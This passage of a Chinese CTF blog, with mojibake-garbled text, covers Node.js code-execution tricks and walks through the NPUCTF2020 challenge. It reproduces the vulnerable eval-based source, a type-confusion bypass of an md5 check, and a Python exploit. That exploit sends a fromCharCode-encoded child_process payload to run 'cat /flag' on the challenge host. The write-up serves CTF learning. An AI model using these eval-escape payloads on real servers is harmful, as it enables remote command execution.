<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;str-1&quot;</span></span><br><span class="line"><span class="keyword">var</span> c = a+b</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a))<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(c)<span class="comment">//[object Object]str-1</span></span><br></pre></td></tr></table></figure>

<p>å¯¹è±¡å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åå¾—åˆ°çš„æ˜¯å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">var</span> b = <span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a))<span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(a+b))<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(a+b)<span class="comment">//1,2,3haha</span></span><br></pre></td></tr></table></figure>

<p>æ•°ç»„å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åä¹Ÿæ˜¯å¾—åˆ°å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åŸºæœ¬å¾—å‡ºç»“è®ºå°±æ˜¯ï¼Œ<strong>nodeJsä¸­ä»»ä½•æ•°æ®ç±»å‹å’Œå­—ç¬¦ä¸²ç›¸åŠ æœ€åå¾—åˆ°çš„éƒ½æ˜¯å­—ç¬¦ä¸²</strong>ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">123</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">console</span>.log(num.length)<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(str.length)<span class="comment">//5</span></span><br><span class="line"><span class="built_in">console</span>.log(b.length)<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p>é•¿åº¦<code>length</code> å±æ€§å¯¹äºå­—ç¬¦ä¸²æ˜¯è¿”å›å­—ç¬¦ä¸²é•¿åº¦ï¼Œè€Œæ•°ç»„æ˜¯è¿”å›æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è€Œæ•°å­—æ˜¯æ²¡æœ‰<code>length</code> çš„ã€‚</p>
<h1 id="æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ"><a href="#æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ"></a><strong>æ¨¡å—åŠ è½½ä¸å‘½ä»¤æ‰§è¡Œ</strong></h1><p>åœ¨ä¸€äº›æ²™ç›’é€ƒé€¸æ—¶æˆ‘ä»¬é€šå¸¸æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„payloadï¼Œè‹¥æ˜¯åœ¨ctfæ¯”èµ›ä¸­ï¼Œæˆ‘ä»¬éœ€è¦getflagæ—¶é€šå¸¸æ˜¯éœ€è¦æƒ³å°½åŠæ³•åŠ è½½æ¨¡å—æ¥è¾¾æˆç‰¹æ®Šè¦æ±‚ã€‚</p>
<p>æ¯”èµ›ä¸­å¸¸è§å¯ä»¥é€šè¿‡<code>child_process</code>æ¨¡å—æ¥åŠ è½½æ¨¡å—ï¼Œè·å¾—<code>exec</code>ï¼Œ<code>execfile</code>ï¼Œ<code>execSync</code>ã€‚</p>
<ul>
<li>é€šè¿‡requireåŠ è½½æ¨¡å—å¦‚ä¸‹</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡globalå¯¹è±¡åŠ è½½æ¨¡å—</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸€äº›ä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰requireçš„æƒ…å†µä¸‹ï¼Œé€šå¸¸æ˜¯æƒ³åŠæ³•ä½¿ç”¨åè€…æ¥åŠ è½½æ¨¡å—ï¼Œäº‹å®ä¸Šï¼ŒNodeJsçš„<code>Function()</code>å¹¶ä¸èƒ½æ‰¾åˆ°requireè¿™ä¸ªå‡½æ•°ã€‚</p>
<p>æœ‰äº›æƒ…å†µä¸‹å¯ä»¥ç›´æ¥ç”¨requireï¼Œå¦‚<code>eval()</code>ã€‚</p>
<p>ä»£ç æ‰§è¡Œ</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec,<span class="number">1000</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec,<span class="number">1000</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="built_in">Function</span>(<span class="string">&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>)();</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å‘ç°å¯¹äºFunctionæ¥è¯´ä¸Šä¸‹æ–‡å¹¶ä¸å­˜åœ¨requireï¼Œéœ€è¦ä»globalä¸­ä¸€è·¯è°ƒå‡ºæ¥execã€‚</p>
<h1 id="NPUCTF2020-éªŒè¯ğŸ"><a href="#NPUCTF2020-éªŒè¯ğŸ" class="headerlink" title="[NPUCTF2020]éªŒè¯ğŸ"></a><strong>[NPUCTF2020]éªŒè¯ğŸ</strong></h1><p>é¢˜ç›®æºç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°saferEvalå‡½æ•°ï¼Œæˆ‘ä»¬çœ‹åˆ°åªè¦ç»•è¿‡æ­£åˆ™ä¹‹åå°±å¯ä»¥åˆ©ç”¨åœ¨ä»£ç æ‰§è¡Œå¤„æ‰€è¯´çš„evalæ¥æ‰§è¡Œä»£ç ã€‚</p>
<p>çœ‹åˆ°è°ƒç”¨äº†saferEvalçš„åœ°æ–¹æœ‰ä¸€ä¸ªç»•è¿‡ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°å¼±ç±»å‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp;md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>æƒ³è¦<code>first</code> å’Œ<code>second</code> é•¿åº¦ä¸€æ ·è€Œä»–ä»¬å†…å®¹åˆä¸ç›¸ç­‰ï¼Œä½†æ˜¯ä»–ä»¬md5åŠ ç›åçš„å€¼åˆè¦ç›¸ç­‰ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹payloadã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;e&quot;</span>:payload,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨äº†<strong>ä»»ä½•æ•°æ®ç±»å‹åŠ ä¸Šå­—ç¬¦ä¸²éƒ½ä¼šè½¬å˜ç§°ä¸ºå­—ç¬¦ä¸²çš„ç‰¹æ€§</strong>ã€‚åŒæ—¶æ•°ç»„å’Œå­—ç¬¦ä¸²çš„é•¿åº¦éƒ½æ˜¯1ä½†æ˜¯ä»–ä»¬å´ä¸å…¨ç­‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://32261d67-37fe-46f4-a1ac-6361db9f2bf5.node3.buuoj.cn/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;e&quot;</span>:<span class="string">&#x27;1+1&#x27;</span>,<span class="string">&quot;first&quot;</span>:[<span class="number">0</span>],<span class="string">&quot;second&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><code>saferEval</code>éƒ¨åˆ†æ„é€ å‡½æ•°æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ç®­å¤´å‡½æ•°é…åˆMathé€šè¿‡åŸå‹è·å–åˆ°Functionï¼Œä½¿ç”¨ä¸Šé¢æåˆ°çš„Functionï¼Œé€šè¿‡globalä¸€è·¯è°ƒå‡ºæ¥execæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>=&gt;(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor)</span><br></pre></td></tr></table></figure>

<p><code>Math=&gt;</code>å…¶å®æ˜¯ä¸ªåŒ¿åå‡½æ•°ï¼Œçœ‹å‡ ä¸ªä¾‹å­</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//x =&gt; x * x</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function">//<span class="title">a</span> = <span class="title">x</span> =&gt; <span class="title">x</span>*<span class="title">x</span></span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span>(<span class="params">(x=&gt;x+x)(<span class="number">2</span>)</span>)//4</span></span><br></pre></td></tr></table></figure>

<p>åé¢æ˜¯ä¸€ä¸ªé€—å·è¿ç®—ï¼Œé€—å·è¿ç®—æˆ‘ä»¬çŸ¥é“æ˜¯ä»å·¦å¾€å³è¿ç®—å†æœ€åè¿”å›æœ€å³è¾¹çš„å€¼ï¼Œæˆ‘ä»¬ç”±æ­¤å¾—çŸ¥è¿™é‡Œæ˜¯æ‰§è¡Œè¿™ä¹ˆä¸ªè¿ç®—ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.constructor.constructor(.....)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.constructor)<span class="comment">//[Function: Object]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.constructor.constructor)<span class="comment">//[Function: Function]</span></span><br></pre></td></tr></table></figure>

<p>Functionæ˜¯æ„é€ å‡½æ•°ä»–èƒ½å¤Ÿåˆ›å»ºå‡½æ•°ï¼Œå¯ä»¥ç®€å•ç†è§£ä»–å’Œevalç±»ä¼¼ï¼Œæµ‹è¯•ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="built_in">Math</span>.constructor.constructor(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> fun = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;return a + b&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>,<span class="number">2</span>))<span class="comment">//3</span></span><br><span class="line"><span class="built_in">console</span>.log(fun(<span class="number">1</span>,<span class="number">2</span>))<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p><code>Math.constructor.constructor()</code> å’Œæ„é€ å‡½æ•°<code>new Function()</code> æ˜¯ç­‰æ•ˆçš„ï¼Œå½“ç„¶å…¶ä»–ä»»æ„å‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚</p>
<p>è¿™æ ·è™½ç„¶å¯ä»¥å¾—åˆ°Functionï¼Œä½†é™äºæ­£åˆ™æˆ‘ä»¬æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œç»•è¿‡é‡‡ç”¨String.fromCharCodeï¼ŒStringå¯ä»¥é€šè¿‡å˜é‡æ‹¼æ¥æ‹¼æ¥å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨constructorè·å–åˆ°Stringå¯¹è±¡ã€‚</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>():</span></span><br><span class="line">    s = <span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line">a = payload()</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot;Start the program:&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://32261d67-37fe-46f4-a1ac-6361db9f2bf5.node3.buuoj.cn/&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">e = <span class="string">&quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;0&#125;))()))(Math+1)&quot;</span>.format(a)</span><br><span class="line">data = json.dumps(&#123;<span class="string">&#x27;e&#x27;</span>: e, <span class="string">&quot;first&quot;</span>: [<span class="number">1</span>], <span class="string">&quot;second&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;)</span><br><span class="line">r = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a><strong>å‚è€ƒé“¾æ¥</strong></h1><p><a class="foo" href="https://www.plasf.cn/2020/04/24/JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ç¬”è®°/#èµ„æº" target="_blank">JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ç¬”è®°</a></p>
<p><a class="foo" href="https://xz.aliyun.com/t/7182#toc-5" target="_blank">æµ…æjavascriptåŸå‹é“¾æ±¡æŸ“æ”»å‡»</a></p>
<p><a class="foo" href="https://xz.aliyun.com/t/7752" target="_blank">nodejsä¸€äº›å…¥é—¨ç‰¹æ€§&amp;&amp;å®æˆ˜</a></p>
<p><a class="foo" href="https://www.plasf.cn/2020/04/25/Nodeä¸“é¢˜è®­ç»ƒ-1" target="_blank">NPUCTF2020 éªŒè¯ğŸ</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="post-title-link" itemprop="url">æ— å‚æ•°RCE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-07-18 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-18T00:00:00+08:00">2020-07-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:54:01" itemprop="dateModified" datetime="2020-10-16T11:54:01+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
